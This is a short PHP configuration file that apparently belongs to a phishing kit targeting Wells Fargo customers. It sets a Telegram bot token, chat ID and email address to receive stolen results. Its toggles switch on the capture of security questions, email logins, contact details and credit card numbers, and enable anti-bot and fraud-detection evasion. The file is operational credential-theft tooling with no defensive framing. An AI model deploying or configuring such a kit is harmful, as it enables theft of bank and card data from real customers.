<?php

$apiToken ="5158655796:AAG26FZEChJdieyfw3PS7IROGDyGfv4HWug"; // Your Telegram Bot API Token
$chat_id ="909377201"; // Your Telegram Chat ID
$your_email = "mkyresult123@gmail.com"; // Your Email here  !! 

$double_login = "no";
$double_access = "no";

$show_question = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";

$redirect = "wells"; // you can change this 
$redirection = "yes";     			   // If you won't to Use Redirection Like { Domain.com?id=wells } Make it Yes .
$api_protection = "yes";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$anti_bot = "yes";


?>